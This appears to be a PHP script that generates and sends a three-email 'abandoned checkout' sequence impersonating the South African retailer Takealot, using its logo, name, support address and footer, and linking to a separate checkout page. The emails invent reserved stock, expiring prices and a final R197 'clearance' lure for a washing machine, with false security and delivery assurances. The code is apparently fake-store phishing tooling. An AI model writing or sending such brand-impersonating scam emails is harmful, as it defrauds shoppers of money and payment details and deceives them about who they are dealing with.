<?php
/**
 * Sequência Completa de 3 E-mails de Recuperação de Checkout (Takealot + Green Send)
 */

function getGreenSendApiKey() {
    $apiKey = getenv('GREEN_SEND_API_KEY');
    if (empty($apiKey) && file_exists(__DIR__ . '/../.env')) {
        $envLines = file(__DIR__ . '/../.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($envLines as $line) {
            if (strpos(trim($line), '#') === 0) continue;
            if (strpos($line, '=') !== false) {
                list($k, $v) = explode('=', $line, 2);
                if (trim($k) === 'GREEN_SEND_API_KEY') return trim($v);
            }
        }
    }
    return $apiKey ?: "";
}

function sendRecoveryEmailStep($step, $lead) {
    $apiKey = getGreenSendApiKey();
    $toEmail = $lead['email'] ?? '';
    if (empty($toEmail) || !filter_var($toEmail, FILTER_VALIDATE_EMAIL)) return false;

    $name = $lead['name'] ?? 'Valued Customer';
    $amount = $lead['amount'] ?? 1899;
    $qty = $lead['quantity'] ?? 1;
    $productTitle = $lead['product_title'] ?? 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
    $is75 = (strpos($productTitle, '75') !== false);
    $productImage = $is75 ? 'https://iili.io/oKD3ZQa.jpg' : 'https://iili.io/oKD3ZQa.jpg';
    $oldPrice = $is75 ? '4,999' : '8,999';

    // Link direto para retornar ao checkout com os dados
    $checkoutUrl = "http://localhost:3015/checkout.html?price={$amount}&qty={$qty}";

    $logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png";

    // Configurações específicas de cada um dos 3 passos
    if ($step === 1) {
        // E-MAIL 1 (15-30 minutos): Lembrete Amigável & Reserva
        $subject = "Did you forget something? Your Takealot order is reserved!";
        $badgeText = "⏳ LIMITED TIME: PROMOTIONAL PRICE RESERVED";
        $badgeColor = "#fff1f2";
        $badgeTextColor = "#e11d48";
        $badgeBorder = "#fecdd3";
        $headline = "You left your Samsung 9kg Washing Machine in your cart!";
        $bodyText = "We noticed you started checking out on Takealot, but didn't finish your order. Good news: we have temporarily saved your items at the promotional deal price of <strong>R {$amount}</strong>.";
        $ctaText = "Complete Your Order Now &rarr;";
        $btnColor = "#0b56a4";
    } elseif ($step === 2) {
        // E-MAIL 2 (6 horas): Escassez & Alerta de Expiração
        $subject = "Action required: Your promotional price of R {$amount} expires soon";
        $badgeText = "⚠️ LOW STOCK ALERT: RESERVATION EXPIRING";
        $badgeColor = "#fffbeb";
        $badgeTextColor = "#b45309";
        $badgeBorder = "#fde68a";
        $headline = "Your promotional reservation is about to expire!";
        $bodyText = "Due to extremely high demand during Black November, we can only hold promotional stock for a short period. Your reserved Washing Machine will be released back to other shoppers soon and the price will return to R {$oldPrice}.";
        $ctaText = "Secure Your Promotional Price Now &rarr;";
        $btnColor = "#b45309";
    } else {
        // E-MAIL 3 (24 horas): Promoção Especial Exclusiva que deixa o produto por apenas R 197
        $amount = 197; // Independentemente do preço anterior
        $subject = "FLASH DEAL: Your Samsung 9kg Washing Machine dropped to ONLY R 197! ⚡";
        $badgeText = "🔥 EXCLUSIVE CLEARANCE PROMOTION: ONLY R 197";
        $badgeColor = "#fef2f2";
        $badgeTextColor = "#dc2626";
        $badgeBorder = "#fca5a5";
        $headline = "Special Clearance Promotion: Complete your order for ONLY R 197!";
        $bodyText = "We noticed your reserved Washing Machine is still waiting in your cart. Because stock must be cleared today, our management unlocked an unprecedented <strong>flash clearance deal</strong>: you can finalize your order right now for <strong>ONLY R 197</strong> (regardless of the original price), plus <strong>Free Nationwide Delivery</strong>.<br><br>This special price of R 197 has been pre-applied to your checkout link below. This offer is valid for the next 2 hours only or until remaining promotional units run out.";
        $ctaText = "Pay Only R 197 & Complete Order Now &rarr;";
        $btnColor = "#dc2626";
        $checkoutUrl = "http://localhost:3015/checkout.html?price=197&qty={$qty}&voucher=TAKE197&promo=flash197";
    }

    $voucherBoxHtml = "";
    $discountBadge = '<span style="display: inline-block; background: #e0f2fe; color: #0369a1; font-size: 11px; font-weight: 700; padding: 2px 6px; border-radius: 4px; margin-left: 6px;">SPECIAL DEAL</span>';

    if ($step === 3) {
        $discountBadge = '<span style="display: inline-block; background: #fee2e2; color: #dc2626; font-size: 11px; font-weight: 800; padding: 2px 7px; border-radius: 4px; margin-left: 6px;">CLEARANCE: R 197</span>';
        $voucherBoxHtml = <<<VOUCHER
    <!-- FLASH PROMO BOX (R197 DEAL) -->
    <div style="background: #fff5f5; border: 2px dashed #e53e3e; border-radius: 8px; padding: 18px 20px; margin: 20px 0; text-align: center;">
      <div style="font-size: 11px; font-weight: 800; color: #c53030; text-transform: uppercase; letter-spacing: 1px;">⚡ Secret Warehouse Clearance Deal</div>
      <div style="font-size: 32px; font-weight: 900; color: #e53e3e; margin: 6px 0 2px;">ONLY R 197</div>
      <div style="font-size: 13.5px; font-weight: 700; color: #2d3748;">Voucher TAKE197 Auto-Applied &bull; Price Dropped to R 197 Flat</div>
      <div style="font-size: 11.5px; color: #718096; margin-top: 4px;">⏳ Valid for the next 2 hours only &bull; Free Priority Delivery Included</div>
    </div>
VOUCHER;
    }

    $htmlBody = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{$subject}</title>
<style>
  body { margin: 0; padding: 0; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #333333; }
  .email-container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; overflow: hidden; border: 1px solid #e1e4e8; }
  .email-header { background-color: #ffffff; padding: 26px 20px; text-align: center; border-bottom: 2px solid #0b56a4; }
  .email-logo { display: block; margin: 0 auto; max-width: 190px; height: auto; }
  .email-content { padding: 32px 26px; }
  .urgency-badge { display: inline-block; background-color: {$badgeColor}; color: {$badgeTextColor}; border: 1px solid {$badgeBorder}; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 800; margin-bottom: 18px; letter-spacing: 0.3px; }
  .greeting { font-size: 20px; font-weight: 800; color: #0b56a4; margin-top: 0; margin-bottom: 12px; }
  .info-box { background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 18px; margin: 22px 0; }
  .cta-btn { display: block; text-align: center; background-color: {$btnColor}; color: #ffffff !important; text-decoration: none; padding: 16px 24px; border-radius: 6px; font-size: 16px; font-weight: 800; margin: 26px 0 12px; letter-spacing: 0.3px; box-shadow: 0 4px 12px rgba(0,0,0,0.12); }
  .email-footer { background-color: #f1f5f9; padding: 22px; text-align: center; font-size: 11.5px; color: #64748b; line-height: 1.6; border-top: 1px solid #e2e8f0; }
</style>
</head>
<body>
<div class="email-container">
  <div class="email-header">
    <img src="{$logoUrl}" alt="takealot.com" class="email-logo" width="190" />
  </div>

  <div class="email-content">
    <div class="urgency-badge">{$badgeText}</div>
    <h2 class="greeting">Hi {$name},</h2>
    
    <p style="font-size: 16px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">
      {$headline}
    </p>
    
    <p style="font-size: 14.5px; line-height: 1.6; color: #4a5568; margin-top: 0;">
      {$bodyText}
    </p>

    {$voucherBoxHtml}

    <!-- PRODUCT CARD -->
    <div class="info-box">
      <div style="font-size: 11.5px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 12px; border-bottom: 1px solid #e2e8f0; padding-bottom: 6px;">
        Reserved Item in Your Cart
      </div>
      
      <table style="width: 100%; border-collapse: collapse;">
        <tr>
          <td style="width: 84px; vertical-align: top; padding-right: 14px;">
            <img src="{$productImage}" alt="Samsung 9kg Washing Machine" width="80" height="80" style="display: block; width: 80px; height: 80px; object-fit: contain; border: 1px solid #e2e8f0; border-radius: 6px; background-color: #ffffff; padding: 3px;" />
          </td>
          <td style="vertical-align: top;">
            <div style="font-size: 14px; font-weight: 700; color: #1a202c; line-height: 1.4;">{$productTitle}</div>
            <div style="font-size: 12px; color: #64748b; margin-top: 4px;">Quantity: {$qty} &bull; Condition: Brand New &bull; Fast Delivery</div>
            <div style="margin-top: 8px;">
              <span style="font-size: 18px; font-weight: 800; color: #0b56a4;">R {$amount}</span>
              <span style="font-size: 13px; color: #94a3b8; text-decoration: line-through; margin-left: 6px;">R {$oldPrice}</span>
              {$discountBadge}
            </div>
          </td>
        </tr>
      </table>
    </div>

    <!-- CTA BUTTON -->
    <a href="{$checkoutUrl}" class="cta-btn" target="_blank">
      {$ctaText}
    </a>

    <p style="font-size: 12.5px; color: #718096; text-align: center; margin: 12px 0 0;">
      Safe, encrypted &amp; verified 3D-Secure payment. Free nationwide delivery.
    </p>

    <!-- TRUST BADGES -->
    <table style="width: 100%; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px; margin-top: 24px; text-align: center; font-size: 12px; color: #475569; padding: 12px 6px;">
      <tr>
        <td style="width: 33.3%;">🔒 <strong>100% Secure</strong><br><span style="font-size: 10.5px; color: #64748b;">3D-Secure Protected</span></td>
        <td style="width: 33.3%; border-left: 1px solid #e2e8f0; border-right: 1px solid #e2e8f0;">🚚 <strong>Fast Delivery</strong><br><span style="font-size: 10.5px; color: #64748b;">Direct to your door</span></td>
        <td style="width: 33.3%;">↩️ <strong>Easy Returns</strong><br><span style="font-size: 10.5px; color: #64748b;">30-Day Hassle Free</span></td>
      </tr>
    </table>
  </div>

  <div class="email-footer">
    &copy; 2026 Takealot Online (Pty) Ltd. 12th Floor, Takealot Building, 10 Rua Vasco Da Gama Plain, Foreshore, Cape Town, 8001.<br>
    All rights reserved. Customer Support: <a href="mailto:support@takealot.co.za" style="color: #0b56a4; text-decoration: none;">support@takealot.co.za</a>
  </div>
</div>
</body>
</html>
HTML;

    $textBody = "Hi {$name},\n\n{$headline}\n\n{$bodyText}\n\nItem: {$productTitle}\nTotal: R {$amount}\n\nComplete your order here:\n{$checkoutUrl}\n\nTakealot Support: support@takealot.co.za";

    $payload = [
        "idempotency_key" => "tak-recovery-step{$step}-" . md5($toEmail . time()),
        "channel" => "email",
        "sender_name" => "Takealot.com",
        "to" => $toEmail,
        "message" => [
            "subject" => $subject,
            "text" => $textBody,
            "html" => $htmlBody,
            "reply_to" => "support@takealot.co.za"
        ],
        "metadata" => [
            "email_type" => "checkout_recovery",
            "recovery_step" => (string)$step,
            "store" => "takealot"
        ]
    ];

    $ch = curl_init("https://greensend.app/v1/messages");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Bearer " . $apiKey,
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200 || $httpCode === 202);
}
